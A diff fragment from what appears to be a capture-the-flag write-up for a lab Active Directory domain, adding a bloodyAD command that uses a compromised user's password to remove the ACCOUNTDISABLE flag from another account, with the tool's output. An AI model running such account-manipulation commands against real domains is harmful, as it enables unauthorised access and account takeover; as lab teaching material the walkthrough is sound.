@@ -694,6 +694,14 @@ userAccountControl: WRITE
 But however i do have access to modify his UAC, so i should be able to re-enable the account
 
 ```python
+❯❯❯ bloodyAD --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k remove uac 'javier.mmarshall' -f ACCOUNTDISABLE
+Clock skew detected. Adjusting local time by 7:00:00.454367. Retrying operation.
+[+] ['ACCOUNTDISABLE'] property flags removed from javier.mmarshall's userAccountControl
+```
+
+This has re enable the account
+
+```python
 
 ```
 
